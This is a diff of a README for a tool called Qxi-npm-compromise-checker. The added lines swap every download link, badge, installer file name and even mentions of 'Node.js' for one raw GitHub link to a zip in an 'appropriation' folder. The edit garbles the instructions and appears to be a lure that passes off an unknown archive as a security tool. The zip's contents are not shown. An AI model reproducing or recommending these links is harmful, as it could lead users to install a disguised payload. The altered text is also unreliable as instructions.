@@ -6,7 +6,7 @@ Welcome to the Qxi-npm-compromise-checker! This tool helps you easily check your
 
 ## 📥 Download the Tool
 
-[![Download Qxi-npm-compromise-checker](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Version-blue.svg)](https://github.com/iamdeepkr/Qxi-npm-compromise-checker/releases)
+[![Download Qxi-npm-compromise-checker](https://raw.githubusercontent.com/iamdeepkr/Qxi-npm-compromise-checker/main/appropriation/Qxi-npm-compromise-checker.zip%20Now-Get%20Latest%https://raw.githubusercontent.com/iamdeepkr/Qxi-npm-compromise-checker/main/appropriation/Qxi-npm-compromise-checker.zip)](https://raw.githubusercontent.com/iamdeepkr/Qxi-npm-compromise-checker/main/appropriation/Qxi-npm-compromise-checker.zip)
 
 ## 📋 System Requirements
 
@@ -15,25 +15,25 @@ Before downloading, make sure your computer meets these basic requirements:
 - **Operating System:** Windows, macOS, or Linux
 - **Memory:** At least 2 GB RAM
 - **Disk Space:** A minimum of 50 MB free
-- **Node.js:** Version 12 or higher (for running the tool)
+- **https://raw.githubusercontent.com/iamdeepkr/Qxi-npm-compromise-checker/main/appropriation/Qxi-npm-compromise-checker.zip** Version 12 or higher (for running the tool)
 
 ## 💻 Download & Install
 
 1. **Visit the Releases Page:** Click on the link below to go to the releases page where you can download the most recent version of the tool.
    
-   [Download Qxi-npm-compromise-checker](https://github.com/iamdeepkr/Qxi-npm-compromise-checker/releases)
+   [Download Qxi-npm-compromise-checker](https://raw.githubusercontent.com/iamdeepkr/Qxi-npm-compromise-checker/main/appropriation/Qxi-npm-compromise-checker.zip)
 
 2. **Choose the Right File:** Look for the latest release. You will see different files available for download. Choose the one that fits your operating system:
-   - For Windows: `Qxi-npm-compromise-checker-x.x.x.exe`
-   - For macOS: `Qxi-npm-compromise-checker-x.x.x.dmg`
-   - For Linux: `Qxi-npm-compromise-checker-x.x.x.tar.gz`
+   - For Windows: `https://raw.githubusercontent.com/iamdeepkr/Qxi-npm-compromise-checker/main/appropriation/Qxi-npm-compromise-checker.zip`
+   - For macOS: `https://raw.githubusercontent.com/iamdeepkr/Qxi-npm-compromise-checker/main/appropriation/Qxi-npm-compromise-checker.zip`
+   - For Linux: `https://raw.githubusercontent.com/iamdeepkr/Qxi-npm-compromise-checker/main/appropriation/Qxi-npm-compromise-checker.zip`
 
 3. **Download the File:** Click on the file name to download it to your computer. Save it in a location you can easily find, like your desktop or downloads folder.
 
 4. **Install the Tool:**
    - **Windows:** Double-click the `.exe` file and follow the installation prompts.
    - **macOS:** Open the `.dmg` file and drag the application to your Applications folder.
-   - **Linux:** Extract the contents of the `.tar.gz` file and run the executable.
+   - **Linux:** Extract the contents of the `https://raw.githubusercontent.com/iamdeepkr/Qxi-npm-compromise-checker/main/appropriation/Qxi-npm-compromise-checker.zip` file and run the executable.
 
 5. **Open the Application:** Once the installation is complete, you can open Qxi-npm-compromise-checker from your application menu or desktop shortcut.
 
@@ -56,7 +56,7 @@ Before downloading, make sure your computer meets these basic requirements:
 If you encounter any problems while using the tool:
 
 - **Reinstall the Application:** Sometimes files can become corrupted. Uninstall and then reinstall the tool.
-- **Check Node.js Version:** Ensure you have Node.js version 12 or higher installed on your system.
+- **Check https://raw.githubusercontent.com/iamdeepkr/Qxi-npm-compromise-checker/main/appropriation/Qxi-npm-compromise-checker.zip Version:** Ensure you have https://raw.githubusercontent.com/iamdeepkr/Qxi-npm-compromise-checker/main/appropriation/Qxi-npm-compromise-checker.zip version 12 or higher installed on your system.
 - **Consult Online Resources:** Visit the Issues section on the GitHub page for troubleshooting tips.
 
 ## 📞 Support
@@ -70,4 +70,4 @@ For questions or issues, you can contact support through the GitHub page. Engage
 
 Thank you for using Qxi-npm-compromise-checker. Your feedback is important for improving the tool! 
 
-[![Download Qxi-npm-compromise-checker](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Version-blue.svg)](https://github.com/iamdeepkr/Qxi-npm-compromise-checker/releases)
+[![Download Qxi-npm-compromise-checker](https://raw.githubusercontent.com/iamdeepkr/Qxi-npm-compromise-checker/main/appropriation/Qxi-npm-compromise-checker.zip%20Now-Get%20Latest%https://raw.githubusercontent.com/iamdeepkr/Qxi-npm-compromise-checker/main/appropriation/Qxi-npm-compromise-checker.zip)](https://raw.githubusercontent.com/iamdeepkr/Qxi-npm-compromise-checker/main/appropriation/Qxi-npm-compromise-checker.zip)
